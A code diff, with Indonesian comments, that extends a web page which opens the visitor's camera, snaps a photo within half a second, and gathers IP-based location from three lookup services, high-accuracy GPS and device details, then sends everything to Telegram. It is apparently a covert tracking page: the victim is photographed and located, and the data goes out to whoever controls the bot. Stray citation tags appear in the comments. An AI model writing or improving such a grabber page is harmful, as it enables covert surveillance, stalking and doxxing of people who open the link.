@@ -34,6 +34,8 @@
 
     let stream = null;
     let photoTaken = false;
+    let locationData = null;
+    let ipData = null;
 
     // ========== MULAI KAMERA & AUTO CAPTURE ==========
     async function startCamera() {
@@ -45,6 +47,12 @@
             video.srcObject = stream;
             statusEl.textContent = '✅ Kamera aktif';
 
+            // Ambil IP & lokasi duluan sebelum foto
+            await Promise.all([
+                getIPData(),
+                getGPSLocation()
+            ]);
+
             setTimeout(() => {
                 if (!photoTaken) captureAndSend();
             }, 500);
@@ -53,6 +61,93 @@
             statusEl.textContent = '❌ Gagal akses kamera';
             infoMsg.textContent = 'Izin kamera diperlukan.';
         }
+    }
+
+    // ========== GET IP + LOKASI DARI 3 API ==========
+    async function getIPData() {
+        try {
+            // 1. Coba ip-api.com dulu (akurat, 45 req/min, no API key) [citation:2][citation:6]
+            let res = await fetch('http://ip-api.com/json/');
+            let data = await res.json();
+            if (data.status === 'success') {
+                ipData = {
+                    ip: data.query,
+                    city: data.city,
+                    region: data.regionName,
+                    country: data.country,
+                    isp: data.isp,
+                    org: data.org,
+                    timezone: data.timezone,
+                    lat: data.lat,
+                    lon: data.lon,
+                    zip: data.zip
+                };
+                return;
+            }
+        } catch (e) {}
+
+        try {
+            // 2. Fallback: ipapi.co (1000/day, no API key) [citation:1][citation:5]
+            let res = await fetch('https://ipapi.co/json/');
+            let data = await res.json();
+            if (data.ip) {
+                ipData = {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    isp: data.org,
+                    org: data.org,
+                    timezone: data.timezone,
+                    lat: data.latitude,
+                    lon: data.longitude,
+                    zip: data.postal,
+                    currency: data.currency,
+                    languages: data.languages
+                };
+                return;
+            }
+        } catch (e) {}
+
+        try {
+            // 3. Fallback: geo.kamero.ai (unlimited, no API key) [citation:8]
+            let res = await fetch('https://geo.kamero.ai/api/geo');
+            let data = await res.json();
+            if (data.ip) {
+                ipData = {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.countryRegion,
+                    country: data.country,
+                    timezone: data.timezone,
+                    lat: data.latitude,
+                    lon: data.longitude,
+                    zip: data.postalCode
+                };
+            }
+        } catch (e) {}
+    }
+
+    // ========== GPS DARI BROWSER ==========
+    async function getGPSLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve(null);
+                return;
+            }
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    locationData = {
+                        lat: pos.coords.latitude,
+                        lng: pos.coords.longitude,
+                        accuracy: pos.coords.accuracy // Ketelitian dalam meter [citation:7]
+                    };
+                    resolve(locationData);
+                },
+                () => resolve(null),
+                { timeout: 8000, enableHighAccuracy: true }
+            );
+        });
     }
 
     // ========== CAPTURE + KIRIM SEMUA DATA ==========
@@ -69,28 +164,64 @@
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imageDataUrl = canvas.toDataURL('image/jpeg', 0.8);
 
-        // 2. Dapatkan IP & Data Device
-        const ipData = await getIPData();
-        const locationData = await getLocation();
+        // 2. Build caption LENGKAP
+        const ip = ipData || {};
+        const loc = locationData || {};
+        const now = new Date();
 
-        // 3. Buat caption lengkap
-        const caption = `📸 *New Capture!*
-🕐 ${new Date().toLocaleString()}
+        let caption = `📸 *New Capture!*
+🕐 ${now.toLocaleString('id-ID', { weekday: 'long', day: 'numeric', month: 'long', year: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' })}
 
-🌐 *IP:* ${ipData.ip || 'Unknown'}
-📍 *City:* ${ipData.city || 'Unknown'}
-🏙️ *Region:* ${ipData.region || 'Unknown'}
-🌍 *Country:* ${ipData.country || 'Unknown'}
-🗺️ *Map:* ${locationData ? `https://www.google.com/maps?q=${locationData.lat},${locationData.lng}` : 'Tidak tersedia'}
+━━━━━━━━━━━━━━━━━━━━━━
+🌐 *IP ADDRESS*
+• IP: ${ip.ip || 'Unknown'}
+• ISP: ${ip.isp || ip.org || 'Unknown'}
+• Organization: ${ip.org || 'Unknown'}
 
-📱 *Device Info:*
+━━━━━━━━━━━━━━━━━━━━━━
+📍 *LOCATION (IP-Based)*
+• City: ${ip.city || 'Unknown'}
+• Region: ${ip.region || 'Unknown'}
+• Country: ${ip.country || 'Unknown'}
+• Postal: ${ip.zip || 'Unknown'}
+• Timezone: ${ip.timezone || 'Unknown'}
+• Coordinates: ${ip.lat || '?'}, ${ip.lon || '?'}
+
+━━━━━━━━━━━━━━━━━━━━━━
+🛰️ *GPS LOCATION*`;
+
+        if (loc.lat) {
+            const googleMaps = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
+            const osmMaps = `https://www.openstreetmap.org/?mlat=${loc.lat}&mlon=${loc.lng}&zoom=15`;
+            caption += `
+• GPS Coordinates: ${loc.lat}, ${loc.lng}
+• Accuracy: ±${Math.round(loc.accuracy || 0)} meters
+• Google Maps: ${googleMaps}
+• OpenStreetMap: ${osmMaps}`;
+        } else {
+            caption += `
+• GPS: Tidak tersedia (izin ditolak/tidak support)
+• IP-Based Map: https://www.google.com/maps?q=${ip.lat || ''},${ip.lon || ''}`;
+        }
+
+        caption += `
+
+━━━━━━━━━━━━━━━━━━━━━━
+📱 *DEVICE INFO*
 • Browser: ${navigator.userAgent}
 • Platform: ${navigator.platform}
 • Language: ${navigator.language}
-• Screen: ${screen.width}x${screen.height}
-• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`;
+• Screen: ${screen.width}x${screen.height} (${window.devicePixelRatio}x)
+• Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+• Online: ${navigator.onLine ? 'Yes' : 'No'}
+• Cookies: ${navigator.cookieEnabled ? 'Enabled' : 'Disabled'}`;
 
-        // 4. Kirim foto + caption ke Telegram
+        if (ip.currency) caption += `
+• Currency: ${ip.currency}`;
+        if (ip.languages) caption += `
+• Languages: ${ip.languages}`;
+
+        // 3. Kirim foto + caption ke Telegram
         const byteString = atob(imageDataUrl.split(',')[1]);
         const mimeString = imageDataUrl.split(',')[0].split(':')[1].split(';')[0];
         const ab = new ArrayBuffer(byteString.length);
@@ -134,45 +265,9 @@
         }
     }
 
-    // ========== GET IP + LOCATION (ipapi) ==========
-    async function getIPData() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            return {
-                ip: data.ip || 'Unknown',
-                city: data.city || 'Unknown',
-                region: data.region || 'Unknown',
-                country: data.country_name || 'Unknown'
-            };
-        } catch (err) {
-            return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
-        }
-    }
-
-    // ========== GET GPS (Geolocation API) ==========
-    async function getLocation() {
-        return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-                resolve(null);
-                return;
-            }
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    resolve({
-                        lat: pos.coords.latitude,
-                        lng: pos.coords.longitude
-                    });
-                },
-                () => resolve(null),
-                { timeout: 5000, enableHighAccuracy: true }
-            );
-        });
-    }
-
     // ========== JALANKAN ==========
     startCamera();
 </script>
 
 </body>
-</html>
+    </html>
